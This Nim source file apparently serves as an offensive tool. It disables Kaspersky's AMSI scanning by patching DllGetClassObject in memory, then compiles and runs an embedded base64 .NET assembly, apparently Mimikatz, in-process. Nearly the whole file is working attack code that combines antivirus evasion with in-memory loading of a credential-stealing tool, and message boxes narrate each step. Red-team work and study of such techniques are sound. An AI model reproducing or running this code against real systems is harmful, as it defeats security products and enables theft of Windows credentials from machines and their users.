
import winim/clr
import strformat
import system
import strutils
import winim
import winim/com
import winim/lean
import os, sequtils

const b64assembly = staticRead"KatzB64.dat"

var code = """
using System;
using System.Reflection;

public class Program
{
    public void Main()
    {
        Assembly assembly = Assembly.Load(Convert.FromBase64String("Properties.Resources.download"));
        Type type = assembly.GetType("KatzAssembly.ClassInteractive");
        object instanceOfMyType = Activator.CreateInstance(type);
    }
}

""".replaceWord("Properties.Resources.download",b64assembly)

when defined amd64:
    echo "[*] Running in x64 process"
    const patchamsi: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]

elif defined i386:
    echo "[*] Running in x86 process"
    const patchamsi: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsiKES(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("c:\\Program Files (x86)\\Kaspersky Lab\\", relative=true))
    var length = len(filesInPath)
    # last dir == newest dir
    echo fmt"c:\\Program Files (x86)\\Kaspersky Lab\\{filesInPath[length-1].path}\\x64\\antimalware_provider.dll"
    amsi = LoadLibrary(fmt"c:\\Program Files (x86)\\Kaspersky Lab\\{filesInPath[length-1].path}\\x64\\antimalware_provider.dll")
    if amsi == 0:
        echo "[X] Failed to load antimalware_provider.dll"
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        echo "[X] Failed to get the address of 'DllGetClassObject'"
        return disabled

    if VirtualProtect(cs, patchamsi.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patchamsi, patchamsi.len)        
        disabled = VirtualProtect(cs, patchamsi.len, op, addr t)
    return disabled

when isMainModule:
  MessageBox(0, fmt"[*] Click OK and i try to load mimi{'\n'}But first hook DllGetClassObject on KES AMSI", "Nim is Powerful", 0)

  var success = PatchAmsiKES()
  echo fmt"[+] AMSI KES disabled: {bool(success)}"
  MessageBox(0, fmt"[+] AMSI KES disabled: {bool(success)}{'\n'}[*] Click OK and i try to compile, load and execute mimi", "Nim is Powerful", 0)

  echo "[*] Installed .NET versions"
  for v in clrVersions():
    echo fmt"    \--- {v}"
  echo "\n"

  var res = compile(code)
  var o = res.CompiledAssembly.new("Program")
  echo fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute"  
  MessageBox(0, fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute{'\n'}" , "Nim is Powerful", 0)

  o.Main()